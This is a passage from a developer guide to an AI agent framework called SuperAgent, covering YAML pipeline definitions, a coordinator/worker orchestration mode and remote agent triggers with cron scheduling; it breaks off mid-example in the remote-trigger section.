# SuperAgent Advanced Usage Guide

This document consolidates all advanced feature documentation for SuperAgent into a single comprehensive reference. It covers multi-agent orchestration, security and permissions, cost management, intelligent learning systems, infrastructure integrations, and development workflow tools.

## Table of Contents

### Multi-Agent & Orchestration
- [1. Pipeline DSL](#1-pipeline-dsl)
- [2. Coordinator Mode](#2-coordinator-mode)
- [3. Remote Agent Tasks & Triggers](#3-remote-agent-tasks--triggers)

### Security & Permissions
- [4. Permission System](#4-permission-system)
- [5. Hook System](#5-hook-system)
- [6. Guardrails DSL](#6-guardrails-dsl)
- [7. Bash Security Validator](#7-bash-security-validator)

### Cost & Resource Management
- [8. Cost Autopilot](#8-cost-autopilot)
- [9. Token Budget Continuation](#9-token-budget-continuation)
- [10. Smart Context Window](#10-smart-context-window)

### Intelligence & Learning
- [11. Adaptive Feedback](#11-adaptive-feedback)
- [12. Skill Distillation](#12-skill-distillation)
- [13. Memory System](#13-memory-system)
- [14. Knowledge Graph](#14-knowledge-graph)
- [15. Extended Thinking](#15-extended-thinking)

### Infrastructure & Integration
- [16. MCP Protocol Integration](#16-mcp-protocol-integration)
- [17. Bridge Mode](#17-bridge-mode)
- [18. Telemetry & Observability](#18-telemetry--observability)
- [19. Tool Search & Deferred Loading](#19-tool-search--deferred-loading)
- [20. Incremental & Lazy Context](#20-incremental--lazy-context)

### Development Workflow
- [21. Plan V2 Interview Phase](#21-plan-v2-interview-phase)
- [22. Checkpoint & Resume](#22-checkpoint--resume)
- [23. File History](#23-file-history)

### Performance & Logging (v0.7.0)
- [24. Performance Optimization](#24-performance-optimization)
- [25. NDJSON Structured Logging](#25-ndjson-structured-logging)

### Innovative Intelligence (v0.7.6)
- [26. Agent Replay & Time-Travel Debugging](#26-agent-replay--time-travel-debugging)
- [27. Conversation Forking](#27-conversation-forking)
- [28. Agent Debate Protocol](#28-agent-debate-protocol)
- [29. Cost Prediction Engine](#29-cost-prediction-engine)
- [30. Natural Language Guardrails](#30-natural-language-guardrails)
- [31. Self-Healing Pipelines](#31-self-healing-pipelines)

---

## 1. Pipeline DSL

> Define multi-step agent workflows as declarative YAML pipelines with dependency resolution, failure strategies, approval gates, and iterative review-fix loops.

### Overview

The Pipeline DSL lets you orchestrate complex agent workflows without writing imperative PHP code. You define pipelines in YAML, specifying steps (agent calls, parallel groups, conditionals, transforms, approval gates, loops), their dependencies, and failure strategies. The `PipelineEngine` resolves execution order via topological sort, manages inter-step data flow through template variables, and emits events for observability.

Key classes:

| Class | Role |
|---|---|
| `PipelineConfig` | Parses and validates YAML pipeline files |
| `PipelineDefinition` | Immutable definition of a single pipeline |
| `PipelineEngine` | Executes pipelines with dependency resolution |
| `PipelineContext` | Runtime state: inputs, step results, template resolution |
| `PipelineResult` | Outcome of a complete pipeline run |
| `StepFactory` | Parses YAML step arrays into `StepInterface` objects |

### Configuration

#### YAML File Structure

```yaml
version: "1.0"

defaults:
  failure_strategy: abort   # abort | continue | retry
  timeout: 300              # seconds, per step
  max_retries: 0            # default retry count

pipelines:
  pipeline-name:
    description: "Human-readable description"
    inputs:
      - name: files
        type: array
        required: true
      - name: branch
        type: string
        default: "main"
    steps:
      - name: step-name
        agent: agent-type
        prompt: "Do something with {{inputs.files}}"
        # ... step-specific config
    outputs:
      report: "{{steps.build-report.output}}"
    triggers:
      - event: push
    metadata:
      team: platform
```

#### Loading Configuration

```php
use SuperAgent\Pipeline\PipelineConfig;

// Single file
$config = PipelineConfig::fromYamlFile('pipelines.yaml');

// Multiple files (later files override same-named pipelines)
$config = PipelineConfig::fromYamlFiles([
    'pipelines/base.yaml',
    'pipelines/team-overrides.yaml',
]);

// From array (useful for testing)
$config = PipelineConfig::fromArray([
    'version' => '1.0',
    'defaults' => ['failure_strategy' => 'abort'],
    'pipelines' => [
        'my-pipeline' => [
            'steps' => [/* ... */],
        ],
    ],
]);

// Validate
$errors = $config->validate();
if (!empty($errors)) {
    foreach ($errors as $error) {
        echo "Validation error: {$error}\n";
    }
}
```

### Usage

#### Running a Pipeline

```php
use SuperAgent\Pipeline\PipelineConfig;
use SuperAgent\Pipeline\PipelineEngine;
use SuperAgent\Pipeline\Steps\AgentStep;
use SuperAgent\Pipeline\PipelineContext;

$config = PipelineConfig::fromYamlFile('pipelines.yaml');
$engine = new PipelineEngine($config);

// Set the agent runner (required for agent steps)
$engine->setAgentRunner(function (AgentStep $step, PipelineContext $ctx): string {
    // Integrate with your agent backend
    $spawnConfig = $step->buildSpawnConfig($ctx);
    return $backend->run($spawnConfig);
});

// Set the approval handler (optional; auto-approves if not set)
$engine->setApprovalHandler(function (\SuperAgent\Pipeline\Steps\ApprovalStep $step, PipelineContext $ctx): bool {
    echo "Approval needed: {$step->getMessage()}\n";
    return readline("Approve? (y/n) ") === 'y';
});

// Register event listeners
$engine->on('pipeline.start', function (array $data) {
    echo "Starting pipeline: {$data['pipeline']} ({$data['steps']} steps)\n";
});

$engine->on('step.end', function (array $data) {
    echo "Step {$data['step']}: {$data['status']} ({$data['duration_ms']}ms)\n";
});

// Run the pipeline
$result = $engine->run('code-review', [
    'files' => ['src/App.php', 'src/Service.php'],
    'branch' => 'feature/new-api',
]);

// Check results
if ($result->isSuccessful()) {
    echo "Pipeline completed!\n";
    $summary = $result->getSummary();
    echo "Steps: {$summary['completed']} completed, {$summary['failed']} failed\n";
} else {
    echo "Pipeline failed: {$result->error}\n";
}

// Access individual step outputs
$scanOutput = $result->getStepOutput('security-scan');
$allOutputs = $result->getAllOutputs();
```

### YAML Reference

#### Step Types

##### 1. Agent Step

Executes a named agent with a prompt template.

```yaml
- name: security-scan
  agent: security-scanner          # agent type name
  prompt: "Scan {{inputs.files}} for vulnerabilities"
  model: claude-haiku-4-5-20251001         # optional: override model
  system_prompt: "You are a security expert" # optional
  isolation: subprocess            # optional: subprocess | docker | none
  read_only: true                  # optional: restrict to read-only tools
  allowed_tools:                   # optional: restrict available tools
    - Read
    - Grep
    - Glob
  input_from:                      # optional: inject context from prior steps
    scan_results: "{{steps.scan.output}}"
    config: "{{steps.load-config.output}}"
  on_failure: retry                # abort | continue | retry
  max_retries: 2
  timeout: 120
  depends_on:
    - load-config
```

The `input_from` map is appended to the prompt as labeled context sections:

```
# Context from previous steps

## scan_results
<resolved output from steps.scan>

## config
<resolved output from steps.load-config>
```

##### 2. Parallel Step

Runs multiple sub-steps concurrently (currently sequential in PHP, but semantically parallel).

```yaml
- name: all-checks
  parallel:
    - name: security-scan
      agent: security-scanner
      prompt: "Check for security issues"
    - name: style-check
      agent: style-checker
      prompt: "Check code style"
    - name: test-coverage
      agent: test-runner
      prompt: "Run tests and report coverage"
  wait_all: true                   # default: true; wait for all sub-steps
  on_failure: continue
```

##### 3. Conditional Step

Wraps any step with a `when` clause. The step is skipped if the condition is not met.

```yaml
- name: deploy
  when:
    step_succeeded: all-tests      # only if all-tests completed
  agent: deployer
  prompt: "Deploy the changes"
  depends_on:
    - all-tests

- name: notify-failure
  when:
    step_failed: all-tests         # only if all-tests failed
  agent: notifier
  prompt: "Notify team: {{steps.all-tests.error}}"

- name: production-deploy
  when:
    input_equals:
      field: environment
      value: production
  agent: deployer
  prompt: "Deploy to production"

- name: hotfix
  when:
    expression:
      left: "{{steps.scan.status}}"
      operator: eq
      right: completed
  agent: fixer
  prompt: "Apply hotfix"
```

Condition types:

| Type | Format | Description |
|---|---|---|
| `step_succeeded` | `step_succeeded: step-name` | True if the named step completed successfully |
| `step_failed` | `step_failed: step-name` | True if the named step failed |
| `input_equals` | `{ field: "key", value: "expected" }` | True if pipeline input matches |
| `output_contains` | `{ step: "name", contains: "text" }` | True if step output contains substring |
| `expression` | `{ left, operator, right }` | Comparison (eq, neq, contains, gt, gte, lt, lte) |

##### 4. Approval Step

Pauses the pipeline and waits for human approval.

```yaml
- name: deploy-gate
  approval:
    message: "All checks passed. Deploy to production?"
    required_approvers: 1
    timeout: 3600                  # seconds to wait for approval
  depends_on:
    - all-checks
```

If no `approvalHandler` callback is registered on the engine, approval gates are auto-approved with a warning.

##### 5. Transform Step

Aggregates or reshapes data from previous steps without calling an agent.

```yaml
# Merge multiple outputs
- name: aggregate
  transform:
    type: merge
    sources:
      security: "{{steps.security-scan.output}}"
      style: "{{steps.style-check.output}}"
      tests: "{{steps.test-coverage.output}}"

# Build a report from a template
- name: report
  transform:
    type: template
    template: |
      # Code Review Report
      ## Security: {{steps.security-scan.status}}
      {{steps.security-scan.output}}
      ## Style: {{steps.style-check.status}}
      {{steps.style-check.output}}

# Extract a field from a step's output
- name: get-score
  transform:
    type: extract
    step: analysis
    field: score

# Map over an array output
- name: format-items
  transform:
    type: map
    step: list-step
    template: "- {{vars.item}}"
```

Transform types:

| Type | Description |
|---|---|
| `merge` | Combine multiple step outputs into one object via `sources` map |
| `template` | Render a string template with `{{...}}` variable resolution |
| `extract` | Pull a specific `field` from a `step`'s output |
| `map` | Apply a template to each element of an array output |

##### 6. Loop Step

Repeats a body of steps until an exit condition is met or the iteration limit is reached. Designed for review-fix cycles.

```yaml
- name: review-fix-loop
  loop:
    max_iterations: 5              # required: prevents infinite loops
    exit_when:
      output_contains:
        step: review
        contains: "LGTM"
    steps:
      - name: review
        agent: reviewer
        prompt: "Review the code for bugs"
      - name: fix
        agent: code-writer
        prompt: "Fix issues: {{steps.review.output}}"
        when:
          expression:
            left: "{{steps.review.output}}"
            operator: contains
            right: "BUG"
```

**Multi-model review loop:**

```yaml
- name: multi-review-loop
  loop:
    max_iterations: 3
    exit_when:
      all_passed:
        - step: claude-review
          contains: "LGTM"
        - step: gpt-review
          contains: "LGTM"
    steps:
      - name: reviews
        parallel:
          - name: claude-review
            agent: reviewer
            model: claude-sonnet-4-20250514
            prompt: "Review for logic bugs"
          - name: gpt-review
            agent: reviewer
            model: gpt-4o
            prompt: "Review for security issues"
      - name: fix
        agent: code-writer
        prompt: "Fix all issues found"
        input_from:
          claude: "{{steps.claude-review.output}}"
          gpt: "{{steps.gpt-review.output}}"
```

Exit condition types:

| Type | Format | Description |
|---|---|---|
| `output_contains` | `{ step, contains }` | Step output contains a substring |
| `output_not_contains` | `{ step, contains }` | Step output does NOT contain a substring |
| `expression` | `{ left, operator, right }` | Comparison expression |
| `all_passed` | Array of `{ step, contains }` | ALL listed steps contain their substrings |
| `any_passed` | Array of `{ step, contains }` | ANY listed step contains its substring |

Loop iteration metadata is accessible in templates:

- `{{loop.<loop-name>.iteration}}` -- current 1-based iteration number
- `{{loop.<loop-name>.max}}` -- max iterations configured

Each iteration overwrites the previous iteration's step results, so `{{steps.review.output}}` always refers to the most recent iteration.

#### Failure Strategies

| Strategy | Behavior |
|---|---|
| `abort` | Stop the pipeline immediately on step failure |
| `continue` | Log the failure and proceed to the next step |
| `retry` | Retry the step up to `max_retries` times before applying abort/continue |

#### Dependency Resolution

Steps can declare dependencies via `depends_on`. The engine uses topological sort (Kahn's algorithm) to determine execution order. If no dependencies exist, steps run in their declared order.

```yaml
steps:
  - name: scan
    agent: scanner
    prompt: "Scan code"

  - name: review
    agent: reviewer
    prompt: "Review {{steps.scan.output}}"
    depends_on:
      - scan

  - name: fix
    agent: fixer
    prompt: "Fix {{steps.review.output}}"
    depends_on:
      - review
```

If a dependency has not completed successfully, the dependent step is skipped with a "Dependencies not met" message.

Circular dependencies are detected and logged; the engine falls back to the original declaration order.

#### Inter-Step Data Flow (Templates)

Templates use `{{...}}` syntax and are resolved at runtime by `PipelineContext`:

| Pattern | Description |
|---|---|
| `{{inputs.key}}` | Pipeline input value |
| `{{steps.name.output}}` | Step output (string or JSON-encoded) |
| `{{steps.name.status}}` | Step status: `completed`, `failed`, `skipped` |
| `{{steps.name.error}}` | Step error message (if failed) |
| `{{vars.key}}` | Custom variable set during execution |
| `{{loop.name.iteration}}` | Current loop iteration (1-based) |
| `{{loop.name.max}}` | Max iterations for a loop |

Unresolved placeholders are kept as-is in the output string. Array/object values are JSON-encoded.

#### Pipeline Outputs

Define output templates that are resolved after the pipeline completes:

```yaml
pipelines:
  code-review:
    outputs:
      report: "{{steps.build-report.output}}"
      score: "{{steps.scoring.output}}"
    steps:
      # ...
```

Resolve them in PHP:

```php
$result = $engine->run('code-review', $inputs);
$context = new PipelineContext($inputs);
// ... populate context with step results
$outputs = $pipeline->resolveOutputs($context);
```

#### Event Listeners

The engine emits events throughout execution. Register listeners with `$engine->on()`:

| Event | Data Keys | Description |
|---|---|---|
| `pipeline.start` | `pipeline`, `inputs`, `steps` | Pipeline execution begins |
| `pipeline.end` | `pipeline`, `status`, `duration_ms`, `summary` | Pipeline execution ends |
| `step.start` | `step`, `description` | A step begins execution |
| `step.end` | `step`, `status`, `duration_ms` | A step finishes |
| `step.retry` | `step`, `attempt`, `max_attempts`, `error` | A step is being retried |
| `step.skip` | `step` | A step is skipped |
| `loop.iteration` | `loop`, `iteration`, `max_iterations` | A loop iteration begins |

```php
$engine->on('step.retry', function (array $data) {
    $logger->warning("Retrying {$data['step']}", [
        'attempt' => $data['attempt'],
        'error' => $data['error'],
    ]);
});

$engine->on('loop.iteration', function (array $data) {
    echo "Loop {$data['loop']}: iteration {$data['iteration']}/{$data['max_iterations']}\n";
});
```

### API Reference

#### `PipelineConfig`

| Method | Description |
|---|---|
| `fromYamlFile(string $path): self` | Load from a YAML file |
| `fromYamlFiles(array $paths): self` | Merge multiple YAML files |
| `fromArray(array $data): self` | Load from an array |
| `validate(): string[]` | Validate and return error messages |
| `getPipeline(string $name): ?PipelineDefinition` | Get a pipeline by name |
| `getPipelines(): PipelineDefinition[]` | Get all pipelines |
| `getPipelineNames(): string[]` | Get all pipeline names |
| `getVersion(): string` | Config version |
| `getDefaultTimeout(): int` | Default timeout in seconds |
| `getDefaultFailureStrategy(): string` | Default failure strategy |

#### `PipelineEngine`

| Method | Description |
|---|---|
| `__construct(PipelineConfig $config, ?LoggerInterface $logger)` | Create engine |
| `setAgentRunner(callable $runner): void` | Set agent execution callback: `fn(AgentStep, PipelineContext): string` |
| `setApprovalHandler(callable $handler): void` | Set approval callback: `fn(ApprovalStep, PipelineContext): bool` |
| `on(string $event, callable $listener): void` | Register an event listener |
| `run(string $pipelineName, array $inputs): PipelineResult` | Run a named pipeline |
| `reload(PipelineConfig $config): void` | Hot-reload configuration |
| `getPipelineNames(): string[]` | List available pipelines |
| `getPipeline(string $name): ?PipelineDefinition` | Get a pipeline definition |
| `getStatistics(): array` | Get `{pipelines, total_steps}` counts |

#### `PipelineResult`

| Method | Description |
|---|---|
| `isSuccessful(): bool` | True if status is `completed` |
| `getStepResults(): StepResult[]` | All step results |
| `getStepResult(string $name): ?StepResult` | Result for a specific step |
| `getStepOutput(string $name): mixed` | Output of a specific step |
| `getAllOutputs(): array` | All outputs keyed by step name |
| `getSummary(): array` | Summary with counts of completed/failed/skipped |

#### `PipelineDefinition`

| Method | Description |
|---|---|
| `validateInputs(array $inputs): string[]` | Validate required inputs |
| `applyInputDefaults(array $inputs): array` | Apply default values |
| `resolveOutputs(PipelineContext $ctx): array` | Resolve output templates |
| `hasTrigger(string $event): bool` | Check if pipeline has a trigger |

### Examples

#### Full Code Review Pipeline

```yaml
version: "1.0"

defaults:
  failure_strategy: continue
  timeout: 120

pipelines:
  code-review:
    description: "Automated code review with security scan, style check, and report"
    inputs:
      - name: files
        type: array
        required: true
      - name: branch
        type: string
        default: "main"

    steps:
      - name: security-scan
        agent: security-scanner
        prompt: "Scan these files for security vulnerabilities: {{inputs.files}}"
        model: claude-haiku-4-5-20251001
        read_only: true
        timeout: 60

      - name: style-check
        agent: style-checker
        prompt: "Check code style in: {{inputs.files}}"
        read_only: true
        timeout: 60

      - name: review-fix-loop
        loop:
          max_iterations: 3
          exit_when:
            output_contains:
              step: review
              contains: "LGTM"
          steps:
            - name: review
              agent: code-reviewer
              prompt: "Review the code for bugs and logic errors"
            - name: fix
              agent: code-writer
              prompt: "Fix issues found: {{steps.review.output}}"
              when:
                expression:
                  left: "{{steps.review.output}}"
                  operator: contains
                  right: "ISSUE"
        depends_on:
          - security-scan
          - style-check

      - name: deploy-gate
        approval:
          message: "Review complete. Deploy branch {{inputs.branch}}?"
          timeout: 3600
        depends_on:
          - review-fix-loop

      - name: build-report
        transform:
          type: template
          template: |
            # Code Review Report
            Branch: {{inputs.branch}}
            ## Security: {{steps.security-scan.status}}
            {{steps.security-scan.output}}
            ## Style: {{steps.style-check.status}}
            {{steps.style-check.output}}
            ## Review Loop
            {{steps.review-fix-loop.output}}
        depends_on:
          - review-fix-loop

    outputs:
      report: "{{steps.build-report.output}}"

    triggers:
      - event: pull_request
```

### Troubleshooting

**"Pipeline 'name' not found"** -- The pipeline name does not exist in the loaded config. Check the YAML file and ensure `PipelineConfig` loaded successfully.

**"Missing required input: 'x'"** -- The pipeline declares a required input that was not provided to `$engine->run()`.

**"Step 'x' must specify one of: agent, parallel, approval, transform, loop"** -- The YAML step definition is missing a recognized type key.

**"Circular dependency detected"** -- Two or more steps depend on each other. The engine logs a warning and falls back to declaration order.

**"AgentStep::runAgent() should not be called directly"** -- You must use `PipelineEngine` and set an agent runner via `setAgentRunner()`. Agent steps cannot execute standalone.

**"No approval handler configured, auto-approving"** -- Register an `approvalHandler` on the engine if you need human-in-the-loop approval gates.

---

## 2. Coordinator Mode

> Dual-mode architecture separating orchestration (Coordinator) from execution (Worker), with tool restrictions, 4-phase workflow, and session persistence.

### Overview

Coordinator Mode implements a strict separation between **orchestration** and **execution**. When enabled, the top-level agent becomes a pure coordinator that never executes tasks directly. Instead, it:

1. **Spawns** independent worker agents via the `Agent` tool
2. **Receives** results as task notifications
3. **Synthesizes** findings into implementation specifications
4. **Delegates** all work to workers

This architecture prevents the coordinator from getting lost in implementation details and ensures each worker operates with a focused, self-contained context.

#### Dual-Mode Architecture

```
                     +-------------------+
                     |   COORDINATOR     |
                     | (Agent, SendMsg,  |
                     |  TaskStop only)   |
                     +--------+----------+
                              |
              +---------------+---------------+
              |               |               |
       +------+------+ +-----+-------+ +-----+-------+
       |  WORKER A   | |  WORKER B   | |  WORKER C   |
       | (Bash, Read,| | (Bash, Read,| | (Bash, Read,|
       |  Edit, etc.)| |  Edit, etc.)| |  Edit, etc.)|
       +-------------+ +-------------+ +-------------+
```

| Role | Tools Available | Purpose |
|------|----------------|---------|
| **Coordinator** | `Agent`, `SendMessage`, `TaskStop` | Orchestrate, synthesize, delegate |
| **Worker** | `Bash`, `Read`, `Edit`, `Write`, `Grep`, `Glob`, etc. | Execute tasks directly |

Workers never have access to `SendMessage`, `TeamCreate`, or `TeamDelete` (internal orchestration tools).

### Configuration

#### Enabling Coordinator Mode

```php
use SuperAgent\Coordinator\CoordinatorMode;

// Enable via constructor
$coordinator = new CoordinatorMode(coordinatorMode: true);

// Enable via environment variable
// export CLAUDE_CODE_COORDINATOR_MODE=1
// or
// export CLAUDE_CODE_COORDINATOR_MODE=true
$coordinator = new CoordinatorMode(); // auto-detects from environment

// Enable/disable at runtime
$coordinator->enable();
$coordinator->disable();

// Check current state
$coordinator->isCoordinatorMode(); // true or false
$coordinator->getSessionMode();     // 'coordinator' or 'normal'
```

#### Using the CoordinatorAgent Definition

For a pre-configured coordinator agent:

```php
use SuperAgent\Agent\BuiltinAgents\CoordinatorAgent;

$agent = new CoordinatorAgent();
$agent->name();          // 'coordinator'
$agent->description();   // 'Orchestrator that delegates work to worker agents'
$agent->allowedTools();  // ['Agent', 'SendMessage', 'TaskStop']
$agent->readOnly();      // true (coordinator never writes files)
$agent->category();      // 'orchestration'
$agent->systemPrompt();  // Full coordinator system prompt
```

### Usage

#### Tool Filtering

The `CoordinatorMode` class handles tool restriction for both sides:

```php
$coordinator = new CoordinatorMode(coordinatorMode: true);

// Filter tools for the coordinator (only orchestration tools)
$coordTools = $coordinator->filterCoordinatorTools($allTools);
// Only: Agent, SendMessage, TaskStop

// Filter tools for workers (remove internal orchestration tools)
$workerTools = $coordinator->filterWorkerTools($allTools);
// Everything except: SendMessage, TeamCreate, TeamDelete

// Get worker tool names (for injection into coordinator context)
$workerToolNames = $coordinator->getWorkerToolNames($allTools);
// ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob', ...]
```

#### System Prompt

The coordinator system prompt defines the complete orchestration protocol:

```php
$coordinator = new CoordinatorMode(true);

$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob'],
    scratchpadDir: '/tmp/scratchpad',
);
```

#### User Context Message

Injected as the first user message to inform the coordinator about worker capabilities:

```php
$userContext = $coordinator->getUserContext(
    workerToolNames: ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob'],
    mcpToolNames: ['mcp_github_create_pr', 'mcp_linear_create_issue'],
    scratchpadDir: '/tmp/scratchpad',
);
// "Workers spawned via the Agent tool have access to these tools: Bash, Read, Edit, ...
//  Workers also have access to MCP tools: mcp_github_create_pr, mcp_linear_create_issue
//  Scratchpad directory: /tmp/scratchpad ..."
```

#### Session Mode Persistence

When resuming a session, the coordinator mode should match the stored session state:

```php
$coordinator = new CoordinatorMode();

// Resume a coordinator session
$warning = $coordinator->matchSessionMode('coordinator');
// Returns: "Entered coordinator mode to match resumed session."

// Resume a normal session while in coordinator mode
$coordinator->enable();
$warning = $coordinator->matchSessionMode('normal');
// Returns: "Exited coordinator mode to match resumed session."

// No change needed
$warning = $coordinator->matchSessionMode('normal');
// Returns: null (already in normal mode)
```

### The 4-Phase Workflow

The coordinator system prompt defines a strict workflow:

#### Phase 1: Research

| Owner | Workers (parallel) |
|-------|-------------------|
| **Purpose** | Investigate the codebase independently |
| **How** | Spawn multiple read-only workers in ONE message |

```
Coordinator: "I need to understand the payment system. Let me spawn research workers."

Worker A: Investigate src/Payment/ directory structure and key classes
Worker B: Read all test files in tests/Payment/ for expected behavior
Worker C: Check config files and environment variables for payment settings
```

#### Phase 2: Synthesis

| Owner | Coordinator |
|-------|-------------|
| **Purpose** | Read findings, understand the problem, craft implementation specs |
| **How** | Read all worker results, then write specific implementation specifications |

The coordinator **never delegates understanding**. It reads all research results and formulates a concrete plan with file paths, line numbers, types, and rationale.

#### Phase 3: Implementation

| Owner | Workers |
|-------|---------|
| **Purpose** | Make changes per the coordinator's spec |
| **How** | Sequential writes -- only one write worker per file set at a time |

```
Coordinator: "Based on my analysis, here is the implementation spec:
  File: src/Payment/StripeGateway.php, line 45
  Change: Add webhook signature verification before processing
  Type: Add method verifyWebhookSignature(string $payload, string $signature): bool
  Why: Current implementation processes webhooks without verification (security risk)"
```

#### Phase 4: Verification

| Owner | Fresh workers |
|-------|--------------|
| **Purpose** | Test changes independently |
| **How** | Always use a fresh worker (independent perspective) |

```
Coordinator: "Spawn a fresh worker to run the test suite and verify the changes."

Worker D (fresh): Run tests, check for regressions, verify new behavior
```

### Continue vs. Spawn Decision

The coordinator must decide whether to continue an existing worker or spawn a fresh one:

| Situation | Action | Why |
|-----------|--------|-----|
| Research explored the files needing edit | **Continue** (SendMessage) | Worker has files in context |
| Research was broad, implementation is narrow | **Spawn fresh** | Avoid dragging noise |
| Correcting failure or extending work | **Continue** | Worker knows what it tried |
| Verifying code from another worker | **Spawn fresh** | Independent perspective |
| Wrong approach entirely | **Spawn fresh** | Clean slate |

#### Task Notifications

When a worker finishes, the coordinator receives an XML notification:

```xml
<task-notification>
  <task-id>agent-xxx</task-id>
  <status>completed|failed|killed</status>
  <summary>Human-readable outcome</summary>
  <result>Agent's final response</result>
</task-notification>
```

#### Scratchpad Directory

Workers can share information through a scratchpad directory:

```php
$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: $toolNames,
    scratchpadDir: '/tmp/project-scratchpad',
);
// Workers can read and write to the scratchpad without permission prompts.
// Use this for durable cross-worker knowledge.
```

### API Reference

#### `CoordinatorMode`

| Method | Return | Description |
|--------|--------|-------------|
| `isCoordinatorMode()` | `bool` | Whether coordinator mode is active |
| `enable()` | `void` | Activate coordinator mode |
| `disable()` | `void` | Deactivate coordinator mode |
| `getSessionMode()` | `string` | `'coordinator'` or `'normal'` |
| `matchSessionMode(string $storedMode)` | `?string` | Match stored session mode; returns warning if switched |
| `filterCoordinatorTools(array $tools)` | `array` | Filter to orchestration tools only |
| `filterWorkerTools(array $tools)` | `array` | Remove internal orchestration tools |
| `getWorkerToolNames(array $tools)` | `string[]` | Get worker-available tool names |
| `getSystemPrompt(array $workerToolNames, ?string $scratchpadDir)` | `string` | Get the full coordinator system prompt |
| `getUserContext(array $workerToolNames, array $mcpToolNames, ?string $scratchpadDir)` | `string` | Get the user context injection message |

#### Constants

| Constant | Value | Description |
|----------|-------|-------------|
| `COORDINATOR_TOOLS` | `['Agent', 'SendMessage', 'TaskStop']` | Tools available to the coordinator |

#### `CoordinatorAgent` (AgentDefinition)

| Method | Return | Description |
|--------|--------|-------------|
| `name()` | `string` | `'coordinator'` |
| `description()` | `string` | Agent description |
| `systemPrompt()` | `?string` | Full coordinator system prompt |
| `allowedTools()` | `?array` | `['Agent', 'SendMessage', 'TaskStop']` |
| `readOnly()` | `bool` | `true` |
| `category()` | `string` | `'orchestration'` |

### Examples

#### Setting Up a Coordinator Session

```php
use SuperAgent\Coordinator\CoordinatorMode;

// Create coordinator
$coordinator = new CoordinatorMode(coordinatorMode: true);

// Get all tools
$allTools = $toolRegistry->getAll();

// Filter for coordinator
$coordTools = $coordinator->filterCoordinatorTools($allTools);
$workerToolNames = $coordinator->getWorkerToolNames($allTools);

// Build system prompt
$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: $workerToolNames,
    scratchpadDir: '/tmp/scratchpad',
);

// Build user context
$userContext = $coordinator->getUserContext(
    workerToolNames: $workerToolNames,
    mcpToolNames: ['mcp_github_create_pr'],
    scratchpadDir: '/tmp/scratchpad',
);

// Configure query engine with coordinator tools only
$engine = new QueryEngine(
    provider: $provider,
    tools: $coordTools,
    systemPrompt: $systemPrompt,
    options: $options,
);
```

#### Anti-Patterns to Avoid

```php
// BAD: Coordinator delegating understanding
// "Based on your findings, fix the bug"
// The coordinator should READ the findings and write a specific spec.

// BAD: Predicting outcomes before notifications arrive
// Don't assume what a worker will find; wait for the notification.

// BAD: Using one worker to check on another
// Always use a FRESH worker for verification.

// BAD: Spawning workers without specific context
// Always include file paths, line numbers, types, and rationale.
```

### When to Use Coordinator Mode

**Use coordinator mode when:**

- The task involves multiple files or subsystems that benefit from parallel investigation
- You want strict separation between planning and execution
- The task requires a research-then-implement workflow
- You need independent verification of changes
- The codebase is large and workers benefit from focused context

**Use normal mode (single agent) when:**

- The task is simple and well-defined (e.g., fix a typo, add an import)
- The task only touches one or two files
- Speed is more important than thorough investigation
- The conversation is interactive and requires rapid back-and-forth

### Troubleshooting

**Coordinator trying to execute tools directly** -- Verify `filterCoordinatorTools()` was applied to the tool list before passing to the engine. Check that only `Agent`, `SendMessage`, and `TaskStop` are in the filtered list.

**Workers not receiving full context** -- Worker prompts must be self-contained. Include all file paths, line numbers, code snippets, and rationale. Workers cannot see the coordinator's conversation. Do not reference "the file we discussed."

**Session mode mismatch after resume** -- Call `matchSessionMode($storedMode)` when resuming a session to ensure the coordinator mode matches. The method returns a warning string if a mode switch occurred.

**Environment variable not detected** -- Set `CLAUDE_CODE_COORDINATOR_MODE=1` or `CLAUDE_CODE_COORDINATOR_MODE=true`. The check happens in the constructor; if you create the object before setting the env var, it will not detect it.

---

## 3. Remote Agent Tasks & Triggers

> Execute agents out-of-process via the Anthropic API, schedule recurring tasks with cron expressions, and manage triggers programmatically. Remote agents run as fully isolated sessions with independent tool sets, git checkouts, and optional MCP connections.

### Overview

The remote agent system enables running SuperAgent tasks on Anthropic's infrastructure (or a compatible API) without keeping a local session alive. It consists of:

- **`RemoteAgentTask`** -- Value object representing a trigger with its ID, name, cron expression, job configuration, status, and MCP connections.
- **`RemoteAgentManager`** -- API client that creates, lists, gets, updates, runs, and deletes triggers via the `/v1/code/triggers` endpoint.
- **`RemoteTriggerTool`** -- Built-in tool for triggering remote workflows from within a conversation.
- **`ScheduleCronTool`** -- Built-in tool for scheduling cron-based tasks from within a conversation.

Remote agents use the `ccr` (Claude Code Remote) job format and support:
- Custom model selection (default: `claude-sonnet-4-6`)
- Configurable tool allowlists
- Git repository sources
- MCP server connections
- Cron scheduling with automatic timezone-to-UTC conversion

### Configuration

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(
    apiBaseUrl: 'https://api.anthropic.com',  // or custom endpoint
    apiKey: env('ANTHROPIC_API_KEY'),
    organizationId: env('ANTHROPIC_ORG_ID'),  // optional
);
```

The API uses the `anthropic-beta: ccr-triggers-2026-01-30` header for the triggers API.

#### Default allowed tools

Remote agents get these tools by default: `Bash`, `Read`, `Write`, `Edit`, `Glob`, `Grep`.

### Usage

#### Creating a trigger

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(
    apiKey: getenv('ANTHROPIC_API_KEY'),
);

// Create a one-shot trigger (no cron)
$trigger = $manager->create(
    name: 'Daily code review',
    prompt: 'Review all PRs opened in the last 24 hours and leave comments.',
    model: 'claude-sonnet-4-6',
    allowedTools: ['Bash', 'Read', 'Glob', 'Grep'],
    gitRepoUrl: 'https://github.com/my-org/my-repo.git',
);

echo $trigger->id;      // 'trig_abc123'
echo $trigger->status;  // 'idle'
```

#### Scheduling with cron

```php
// Create a trigger that runs every weekday at 9 AM UTC
$trigger = $manager->create(
    name: 'Morning dependency check',
    prompt: 'Check for outdated dependencies and create issues for critical updates.',
    cronExpression: '0 9 * * 1-5',  // UTC
);

// Convert local timezone to UTC
$utcCron = RemoteAgentManager::cronToUtc('0 9 * * 1-5', 'America/New_York');
// '0 14 * * 1-5' (EST is UTC-5)

$trigger = $manager->create(
    name: 'Evening report',
    prompt: 'Generate a daily status report.',
